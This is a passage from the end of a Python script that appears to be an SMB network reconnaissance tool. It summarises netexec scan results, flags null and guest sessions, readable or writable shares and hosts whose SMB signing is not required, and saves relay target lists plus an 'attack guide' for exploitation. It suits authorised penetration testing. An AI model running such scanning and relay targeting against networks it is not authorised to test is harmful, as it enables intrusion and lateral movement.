                
                # Determine session type
                if netexec_data['authentication'] == 'Anonymous':
                    result['null_session'] = True
                elif netexec_data['authentication'] == 'Guest':
                    result['guest_access'] = True
                
                # Check for interesting shares
                for share in result['shares']:
                    if any(interesting.lower() in share['name'].lower() 
                           for interesting in INTERESTING_SHARES):
                        result['interesting_shares'].append(share['name'])
        
        if result['smb_enabled']:
            smb_found += 1
        
        results.append(result)
    
    # Rest of the processing...
    print(f"\n{Colors.OKGREEN}[+] Scan Complete!{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Total hosts scanned: {len(results)}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Hosts with SMB: {smb_found}{Colors.ENDC}")
    
    # Show results with enhanced details
    for result in results:
        if result['smb_enabled']:
            # Determine confidence
            if result['accessible_shares']:
                confidence = f"{Colors.OKGREEN}[HIGH]{Colors.ENDC}"
            elif result['shares']:
                confidence = f"{Colors.WARNING}[MEDIUM]{Colors.ENDC}"
            else:
                confidence = f"{Colors.OKBLUE}[LOW]{Colors.ENDC}"
            
            # Build detailed info string
            info_parts = []
            
            # Hostname and domain
            if result['hostname'] and result['hostname'] != 'Unknown':
                if result['domain'] and result['domain'] != 'Unknown':
                    info_parts.append(f"{result['hostname']}.{result['domain']}")
                else:
                    info_parts.append(f"{result['hostname']}")
            
            # OS info
            if result['os'] and result['os'] != 'Unknown':
                info_parts.append(f"OS: {result['os']}")
            
            # SMBv1 warning
            if result['smbv1']:
                info_parts.append(f"{Colors.FAIL}SMBv1: ENABLED{Colors.ENDC}")
            
            # Share count
            if result['shares']:
                info_parts.append(f"Shares: {len(result['shares'])}")
                share_names = [s['name'] for s in result['shares']]
                info_parts.append(f"({', '.join(share_names[:3])}{'...' if len(share_names) > 3 else ''})")
            
            # SMB signing status (detailed)
            signing_info = ""
            if result['smb_signing']:
                if result['smb_signing']['relay_vulnerable']:
                    if result['smb_signing']['signing_enabled']:
                        signing_info = f"{Colors.WARNING}[SIGNING: Enabled but NOT Required - RELAY VULNERABLE]{Colors.ENDC}"
                    else:
                        signing_info = f"{Colors.FAIL}[SIGNING: DISABLED - RELAY VULNERABLE]{Colors.ENDC}"
                elif result['smb_signing']['signing_required']:
                    signing_info = f"{Colors.OKGREEN}[SIGNING: REQUIRED - Protected]{Colors.ENDC}"
            
            # Session type
            session_info = ""
            if result['null_session']:
                session_info = f"{Colors.WARNING}[NULL SESSION ALLOWED]{Colors.ENDC}"
            elif result['guest_access']:
                session_info = f"{Colors.WARNING}[GUEST ACCESS ALLOWED]{Colors.ENDC}"
            
            # Combine all info
            info_str = " | ".join(filter(None, info_parts))
            status_parts = [signing_info, session_info]
            status_str = " ".join(filter(None, status_parts))
            
            print(f"{confidence} {result['ip']} - {info_str}")
            if status_str:
                print(f"    {status_str}")
            
            # Show interesting shares
            if result['interesting_shares']:
                print(f"    {Colors.WARNING}★ INTERESTING SHARES: {', '.join(result['interesting_shares'])}{Colors.ENDC}")
            
            # Show accessible shares
            if result['accessible_shares']:
                for share in result['accessible_shares']:
                    print(f"    {Colors.OKGREEN}✓ ACCESSIBLE: \\\\{result['ip']}\\{share['name']} "
                         f"(R:{share['readable']}, W:{share['writable']}, Files:{share['files_found']}){Colors.ENDC}")
        
        elif args.verbose:
            print(f"[ ] {result['ip']} - No SMB")
    
    # Summary
    print(f"\n{Colors.HEADER}{'=' * 70}{Colors.ENDC}")
    print(f"{Colors.HEADER}Scan Complete{Colors.ENDC}")
    print(f"{Colors.HEADER}{'=' * 70}{Colors.ENDC}")
    print(f"Total Hosts Scanned: {len(results)}")
    print(f"Hosts with SMB: {smb_found}")
    
    hosts_with_shares = sum(1 for r in results if r['shares'])
    hosts_with_access = sum(1 for r in results if r['accessible_shares'])
    null_session_hosts = sum(1 for r in results if r['null_session'])
    guest_access_hosts = sum(1 for r in results if r['guest_access'])
    
    # SMB signing statistics
    relay_vulnerable = sum(1 for r in results if r['smb_signing'] and r['smb_signing']['relay_vulnerable'])
    signing_required = sum(1 for r in results if r['smb_signing'] and r['smb_signing']['signing_required'])
    
    print(f"Hosts with Shares: {hosts_with_shares}")
    if args.test_access:
        print(f"Hosts with Accessible Shares: {hosts_with_access}")
    print(f"Null Session Allowed: {null_session_hosts}")
    print(f"Guest Access Allowed: {guest_access_hosts}")
    
    # Highlight relay vulnerabilities
    if relay_vulnerable > 0:
        print(f"{Colors.FAIL}SMB Relay Vulnerable: {relay_vulnerable} ⚠{Colors.ENDC}")
    print(f"SMB Signing Required: {signing_required}")
    
    # Save results
    if smb_found > 0:
        print()
        save_smb_list(results)
        if hosts_with_access > 0:
            save_share_list(results)
        save_details(results)
        
        # Save relay targets and attack guide
        relay_count = save_relay_targets(results)
        if relay_count > 0:
            save_smb_attack_guide(results)
            print(f"\n{Colors.WARNING}[!] CRITICAL: {relay_count} hosts vulnerable to SMB relay attacks!{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] Review SMB_ATTACK_GUIDE.txt for exploitation steps{Colors.ENDC}")
    
    return 0

if __name__ == '__main__':
    exit(main())
